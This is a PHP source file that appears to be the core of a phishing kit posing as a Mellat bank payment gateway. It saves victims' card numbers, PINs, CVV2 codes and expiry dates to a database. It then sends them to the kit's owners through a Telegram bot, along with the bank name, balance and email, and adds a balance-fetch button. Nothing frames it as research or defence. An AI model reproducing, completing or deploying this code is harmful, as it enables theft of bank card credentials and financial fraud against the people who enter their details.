﻿<?php

if (!defined('ROOT'))
{
	include_once('../Views/404.php');
	exit();
}

class Application
{
    public $Router = null;

    public function __construct()
    {
        $this->Router = new Router();
        $this->Bot = new Telegram(BOT_TOKEN);

        $this->Router->Call('startpay.mellat',		function() {	Website::StartPay($this);	});
        $this->Router->Call('payment.mellat',		function() {	Website::Payment($this);	});
        $this->Router->Call('sale.mellat',			function() {	Website::Sale($this);		});
        $this->Router->Call('result.mellat',		function() {	Website::Result($this);		});
        // $this->Router->Call('captchaimg.jpg',		function() {	Website::Captcha($this);	});

        $this->Router->Execute($this);
        $this->LoadTheme();
    }

    public function BotUpdateMessageId($RefId, $MessageId, $CardNumber, $Pin, $CVV2, $ExpireMonth, $ExpireYear)
    {
        $DB = $this->DB();

        $STMT = $DB->prepare("UPDATE `credit_cards` SET `MessageId` = ? WHERE `RefId` = ? AND `CardNumber` = ? AND `Pin` = ? AND `CVV2` = ? AND `ExpireMonth` = ? AND `ExpireYear` = ?;");
        $STMT->bind_param("issssss", $MessageId, $RefId, $CardNumber, $Pin, $CVV2, $ExpireMonth, $ExpireYear);
        $STMT->execute();
        $STMT->close();
    }

    public function BotSendCard($RefId, $CardNumber, $Pin, $CVV2, $ExpireMonth, $ExpireYear, $Email = 'Unknown', $Balance = 'Unknown')
    {
        $DB = $this->DB();
        $CardPrefix = substr($CardNumber, 0, 6);

        $STMT = $DB->prepare("SELECT COUNT(*), `Name`, `Logo`, `Website`, `USSD`, `TBank`, `Fetchable` FROM banks WHERE `CardNo` = ?;");
        $STMT->bind_param("s", $CardPrefix);
        $STMT->execute();
        $STMT->bind_result($Exists, $Name, $Logo, $Website, $USSD, $TBank, $Fetchable);
        $STMT->fetch();
        $STMT->close();

        if (!$Exists)
        {
            $Name = 'Unknown Bank';
            $Website = "#";
            $USSD = '#';
            $TBank = '#';
            $Logo = "unknown.png";
        }

        $Pan1 = substr($CardNumber, 0, 4);
        $Pan2 = substr($CardNumber, 4, -8);
        $Pan3 = substr($CardNumber, 8, -4);
        $Pan4 = substr($CardNumber, 12);

        $Balance = is_int($Balance) ? number_format($Balance) . ' IRR' : $Balance;

        foreach (BOT_OWNERS as $UserID)
        {
            $InlineMarkup = null;

            if ($Fetchable)
            {
                $InlineMarkup = $this->Bot->BuildInlineKeyboard(
                    [
                        [
                            $this->Bot->BuildInlineKeyboardButton('♻️ Fetch Balance', '', 'Fetch Balance'),
                        ],
                        [
                            $this->Bot->BuildInlineKeyboardButton('🌐 Website', $Website),
                        ],
                    ]);
            }
            else if (strlen($Website) > 1)
            {
                $InlineMarkup = $this->Bot->BuildInlineKeyboard(
                    [
                        [
                            $this->Bot->BuildInlineKeyboardButton('🌐 Website', $Website)
                        ]
                    ]);
            }

            $Message = $this->Bot->SendPhoto($UserID, new CURLFile(ROOT . "img/bank-logo/$Logo"),
            [
                'caption' => "🏦 Bank: $Name\n\n💳 Card: <code>$Pan1-$Pan2-$Pan3-$Pan4</code>\n🔐 Pin: <code>$Pin</code>\n🔑 CVV2: <code>$CVV2</code>\n📅 Year: <code>$ExpireYear</code>  Month: <code>$ExpireMonth</code>\n📧 Email: <code>$Email</code>\n♻️ Balance: <code>$Balance</code>\n\n📱 USSD: <code>$USSD</code>\n📞 TBank: <code>$TBank</code>",
                'parse_mode' => 'HTML',
                'disable_web_page_preview' => true,
                'reply_markup' => $InlineMarkup
            ]);

            if ($Message->ok)
                $this->BotUpdateMessageId($RefId, $Message->result->message_id, $CardNumber, $Pin, $CVV2, $ExpireMonth, $ExpireYear);
        }
    }

    public function ValidateCardNumber($CardNo)
    {
        if (strlen($CardNo) < 16 || intval(substr($CardNo, 1, 10)) == 0 || intval(substr($CardNo, 10,6)) == 0)
            return false;

        $s = 0;
        $k = 0;
        $d = 0;

        for ($i = 0; $i < 16; $i++)
        {
            $k = ($i % 2 == 0) ? 2 : 1;
            $d = intval(substr($CardNo, $i, 1)) * $k;
            $s += ($d > 9) ? $d - 9 : $d;
        }

        return (($s % 10) == 0);
    }

    public function ValidateRefId($RefId)
    {
        $DB = $this->DB();

        $STMT = $DB->prepare("SELECT COUNT(*) FROM `transactions` WHERE `RefId` = ? AND `Completed` = 0;");
        $STMT->bind_param("s", $RefId);
        $STMT->execute();
        $STMT->bind_result($Count);
        $STMT->fetch();
        $STMT->close();

        return $Count;
    }

    public function GetSaleOrderId($RefId)
    {
        $DB = $this->DB();

        $STMT = $DB->prepare("SELECT `SaleOrderId` FROM `transactions` WHERE `RefId` = ?;");
        $STMT->bind_param("s", $RefId);
        $STMT->execute();
        $STMT->bind_result($OrderId);
        $STMT->fetch();
        $STMT->close();

        return $OrderId;
    }

    public function GetRequest($RefId)
    {
        $DB = $this->DB();

        $STMT = $DB->prepare("SELECT `Request` FROM `transactions` WHERE `RefId` = ?;");
        $STMT->bind_param("s", $RefId);
        $STMT->execute();
        $STMT->bind_result($Request);
        $STMT->fetch();
        $STMT->close();

        return $Request;
    }

    public function GetAmount($RefId)
    {
        $DB = $this->DB();

        $STMT = $DB->prepare("SELECT `Amount` FROM `transactions` WHERE `RefId` = ?;");
        $STMT->bind_param("s", $RefId);
        $STMT->execute();
        $STMT->bind_result($Amount);
        $STMT->fetch();
        $STMT->close();

        return $Amount;
    }

    public function PaymentFinished($RefId)
    {
        $DB = $this->DB();

        $STMT = $DB->prepare("UPDATE `transactions` SET `Completed` = 1 WHERE `RefId` = ?;");
        $STMT->bind_param("s", $RefId);
        $STMT->execute();
        $STMT->close();
    }

	public function LoadTheme()
	{
		if (!$this->Router->Executed)
			include_once(ROOT . "App/Views/Default.php");
	}

    public function SetSession($Index, $Value)
    {
        $_SESSION[$Index] = $Value;
    }

    public function GetSession($Index)
    {
        if (isset($_SESSION[$Index]))
            return $_SESSION[$Index];
    }

    public function DestroySession($Index, $EveryThing = false)
    {
        if (isset($_SESSION[$Index]))
            unset($_SESSION[$Index]);

        if ($EveryThing)
        {
            session_unset();
            session_destroy();
        }
    }

    public function DB()
    {
        try
        {
            $DB = new mysqli(DB_HOST, DB_USERNAME, DB_PASSWORD, DB_NAME, DB_PORT);
            $DB->set_charset("utf8");

            return $DB;
        }
        catch (Exception $e)
        {
            Tracer("DataBaseError.log", "Connection Error:" . $e->getMessage());
            JSON(['Status' => 'Failed', 'Message' => $e->getMessage()]);
        }
    }
}
